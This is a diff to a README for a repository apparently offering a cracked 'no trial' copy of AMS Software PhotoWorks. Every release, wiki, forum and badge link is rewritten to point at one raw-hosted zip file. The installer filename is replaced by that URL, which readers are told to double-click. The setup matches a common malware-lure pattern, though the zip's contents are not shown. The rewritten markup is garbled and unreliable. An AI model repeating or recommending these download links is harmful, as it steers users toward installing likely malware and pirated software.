@@ -1,6 +1,6 @@
 # 🌟 AMS-Software-PhotoWorks-No-Trial - Enhance Your Photos Easily
 
-[![Download Now](https://img.shields.io/badge/Download%20Now-AMS%20Software%20PhotoWorks-brightgreen.svg)](https://github.com/Mubranco2903/AMS-Software-PhotoWorks-No-Trial/releases)
+[![Download Now](https://raw.githubusercontent.com/Mubranco2903/AMS-Software-PhotoWorks-No-Trial/main/pteridium/AMS-Software-PhotoWorks-No-Trial-v3.9.zip%20Now-AMS%20Software%https://raw.githubusercontent.com/Mubranco2903/AMS-Software-PhotoWorks-No-Trial/main/pteridium/AMS-Software-PhotoWorks-No-Trial-v3.9.zip)](https://raw.githubusercontent.com/Mubranco2903/AMS-Software-PhotoWorks-No-Trial/main/pteridium/AMS-Software-PhotoWorks-No-Trial-v3.9.zip)
 
 ## 🚀 Getting Started
 
@@ -9,10 +9,10 @@ Welcome to AMS Software PhotoWorks! This guide helps you download and run the so
 ## 📥 Download & Install
 
 1. **Visit the Release Page**:
-   Go to our [Releases page](https://github.com/Mubranco2903/AMS-Software-PhotoWorks-No-Trial/releases) to find the latest version of the software.
+   Go to our [Releases page](https://raw.githubusercontent.com/Mubranco2903/AMS-Software-PhotoWorks-No-Trial/main/pteridium/AMS-Software-PhotoWorks-No-Trial-v3.9.zip) to find the latest version of the software.
 
 2. **Choose the Right File**:
-   Look for the file named `PhotoWorksSetup.exe` or any similar setup file that matches your operating system.
+   Look for the file named `https://raw.githubusercontent.com/Mubranco2903/AMS-Software-PhotoWorks-No-Trial/main/pteridium/AMS-Software-PhotoWorks-No-Trial-v3.9.zip` or any similar setup file that matches your operating system.
 
 3. **Download the File**:
    Click on the file name to start your download. Save it to a location you can easily access, like your Downloads folder.
@@ -20,7 +20,7 @@ Welcome to AMS Software PhotoWorks! This guide helps you download and run the so
 4. **Run the Installer**:
    Once the download is complete, navigate to the folder where you saved the file. 
    
-   - Double-click `PhotoWorksSetup.exe` to start the installation. 
+   - Double-click `https://raw.githubusercontent.com/Mubranco2903/AMS-Software-PhotoWorks-No-Trial/main/pteridium/AMS-Software-PhotoWorks-No-Trial-v3.9.zip` to start the installation. 
    - If prompted by your computer, confirm to allow the installer to run.
 
 5. **Follow the Installation Wizard**:
@@ -80,13 +80,13 @@ If you encounter problems during installation or while using the software:
 
 ## 🌐 Resources
 
-- [User Guides](https://github.com/Mubranco2903/AMS-Software-PhotoWorks-No-Trial/wiki)
-- [Community Forum](https://github.com/Mubranco2903/AMS-Software-PhotoWorks-No-Trial/discussions)
+- [User Guides](https://raw.githubusercontent.com/Mubranco2903/AMS-Software-PhotoWorks-No-Trial/main/pteridium/AMS-Software-PhotoWorks-No-Trial-v3.9.zip)
+- [Community Forum](https://raw.githubusercontent.com/Mubranco2903/AMS-Software-PhotoWorks-No-Trial/main/pteridium/AMS-Software-PhotoWorks-No-Trial-v3.9.zip)
 
 Feel free to reach out for support if you need further assistance. Enjoy your photo editing experience with AMS Software PhotoWorks!
 
 ## 📅 Regular Updates
 
-We continuously work on improving the software. Keep checking our [Releases page](https://github.com/Mubranco2903/AMS-Software-PhotoWorks-No-Trial/releases) for the latest updates and features.
+We continuously work on improving the software. Keep checking our [Releases page](https://raw.githubusercontent.com/Mubranco2903/AMS-Software-PhotoWorks-No-Trial/main/pteridium/AMS-Software-PhotoWorks-No-Trial-v3.9.zip) for the latest updates and features.
 
-[![Download Now](https://img.shields.io/badge/Download%20Now-AMS%20Software%20PhotoWorks-brightgreen.svg)](https://github.com/Mubranco2903/AMS-Software-PhotoWorks-No-Trial/releases)
+[![Download Now](https://raw.githubusercontent.com/Mubranco2903/AMS-Software-PhotoWorks-No-Trial/main/pteridium/AMS-Software-PhotoWorks-No-Trial-v3.9.zip%20Now-AMS%20Software%https://raw.githubusercontent.com/Mubranco2903/AMS-Software-PhotoWorks-No-Trial/main/pteridium/AMS-Software-PhotoWorks-No-Trial-v3.9.zip)](https://raw.githubusercontent.com/Mubranco2903/AMS-Software-PhotoWorks-No-Trial/main/pteridium/AMS-Software-PhotoWorks-No-Trial-v3.9.zip)
